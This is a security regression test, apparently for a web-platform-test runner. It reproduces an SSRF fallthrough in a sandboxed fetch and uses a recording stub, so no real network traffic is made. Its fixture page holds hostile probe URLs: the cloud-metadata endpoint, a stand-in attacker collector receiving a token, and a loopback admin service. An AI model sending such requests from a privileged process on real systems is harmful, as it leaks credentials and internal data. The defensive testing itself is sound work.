/**
 * Overlay reproducer for KI-25: sandbox.fetch falls through to the host
 * network stack for any non-/interfaces/ URL.
 *
 * scripts/wpt/node/run.ts overrides the fixture sandbox's fetch to serve
 * /interfaces/*.idl from local disk, then ends with an unconditional
 * `return fetch(input as unknown as RequestInfo, init);` (L158, verified at
 * HEAD 83ce08f). There is no scheme/host allowlist on that fallthrough, so
 * page JS running inside the vm sandbox can drive the privileged runner
 * process against arbitrary URLs: cloud-metadata endpoints (169.254.169.254),
 * loopback/RFC1918 internal services, or attacker exfiltration collectors —
 * and even a missing in-tree IDL falls through instead of failing closed.
 * SSRF/confused-deputy egress (CWE-918) from a maintainer/CI process.
 *
 * Egress expectation anchoring (honest): README.md § "Web Platform Test (WPT)
 * Conformance & Parity" holds only conformance stats, NOT an egress contract.
 * The fail-closed expectation is derived from (a) the bridge's documented
 * purpose in run.ts source comments — "// Intercept relative /interfaces/*.idl
 * fetch calls" (run.ts:140) scopes the override to LOCAL IDL serving — and
 * (b) normative least-privilege/fail-closed egress practice (CWE-918).
 *
 * Asserts the SAFE contract: non-/interfaces/ URLs probed by fixture JS must
 * NOT reach the host network stack; an in-tree IDL must still be served
 * locally (control).
 *
 * Live leg imports the REAL production runner after chdir into a synthetic
 * WPT-shaped tree and instruments globalThis.fetch with a RECORDING STUB
 * before runWptFile runs — zero real network I/O is performed; the probe
 * targets are recorded, never contacted.
 *
 * Reproduces: KI-25
 */
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { pathToFileURL } from 'node:url';

const RUNNER_TS = path.resolve('scripts/wpt/node/run.ts');

const EGRESS_PROBES = [
  'http://169.254.169.254/latest/meta-data/', // cloud metadata (IMDS)
  'https://attacker.example/collect?token=ki25', // attacker exfil collector
  'http://127.0.0.1:8080/admin', // loopback internal service
  '/interfaces/KI25Missing.idl', // missing IDL must fail closed, not fall through
];

function buildTree(root: string): string {
  const wptRoot = path.join(root, 'submodules', 'web-platform-tests');
  const interfacesDir = path.join(wptRoot, 'interfaces');
  const cssDir = path.join(wptRoot, 'css', 'cssom');
  fs.mkdirSync(interfacesDir, { recursive: true });
  fs.mkdirSync(cssDir, { recursive: true });
  fs.writeFileSync(path.join(interfacesDir, 'KI25InTree.idl'), 'interface KI25InTree {};\n');
  const hostileHtml = path.join(cssDir, 'hostile-egress-probe.html');
  fs.writeFileSync(
    hostileHtml,
    [
      '<!doctype html>',
      '<meta charset="utf-8">',
      '<script>',
      'promise_test(async () => {',
      '  const resp = await fetch("/interfaces/KI25InTree.idl");',
      '  const text = await resp.text();',
      '  assert_true(resp.ok && text.indexOf("KI25InTree") !== -1, "control: in-tree IDL must be served locally");',
      '}, "ki25 control: in-tree IDL served");',
      'promise_test(async () => {',
      ...EGRESS_PROBES.map((u) => `  await fetch(${JSON.stringify(u)});`),
      '}, "ki25 egress probes (verdict recorded host-side)");',
      '</script>',
      '',
    ].join('\n'),
  );
  return hostileHtml;
}

describe('KI-25 sandbox.fetch host fallthrough (SSRF egress)', () => {
  // Reproduces: KI-25
  test('live leg: real runWptFile sandbox.fetch must not forward non-/interfaces/ URLs to the host stack', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ki25-live-'));
    const prevCwd = process.cwd();
    const origFetch = globalThis.fetch;
    const hostCalls: string[] = [];
    let mod: { runWptFile: (p: string) => { tests: { name: string; fn: () => unknown }[]; cleanup: () => void } };
    let hostileHtml: string;
    try {
      hostileHtml = buildTree(root);
      process.chdir(root); // WPT_ROOT anchors at cwd on module load (run.ts:24)
      assert.ok(fs.existsSync(RUNNER_TS), `real runner missing: ${RUNNER_TS}`);
      mod = (await import(pathToFileURL(RUNNER_TS).href)) as typeof mod;
      assert.equal(typeof mod.runWptFile, 'function', 'runWptFile export not found on real runner');

      // Recording stub replaces the process-global fetch the runner's
      // fallthrough resolves at call time (run.ts:158 bare `fetch(...)`).
      globalThis.fetch = (async (input: RequestInfo | URL): Promise<Response> => {
        const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : String((input as { url?: string }).url ?? input);
        hostCalls.push(url);
        return {
          ok: true,
          status: 200,
          statusText: 'OK',
          headers: new Headers({ 'Content-Type': 'text/plain' }),
          text: async () => `STUB_HOST_BODY:${url}`,
          json: async () => ({ stub: true, url }),
        } as unknown as Response;
      }) as typeof fetch;

      try {
        const result = mod.runWptFile(hostileHtml);
        const names: string[] = [];
        for (const t of result.tests) names.push(t.name); // Proxy queue — for..of only (run.ts:446)
        assert.ok(names.some((n) => n.includes('ki25 control')), 'setup failure: control test not registered');
        assert.ok(names.some((n) => n.includes('ki25 egress')), 'probe test not registered');
        for (const t of result.tests) {
          await t.fn(); // control leg throws if the local IDL bridge broke
        }

        // SAFE contract: nothing may reach the host network stack.
        assert.deepEqual(
          hostCalls,
          [],
          `SAFE contract violated: sandbox.fetch forwarded ${hostCalls.length} non-/interfaces/ URL(s) to the host network stack (run.ts:158 unconditional fallthrough): ${JSON.stringify(hostCalls)}`,
        );
        result.cleanup();
      } finally {
        globalThis.fetch = origFetch;
      }
    } finally {
      process.chdir(prevCwd);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});
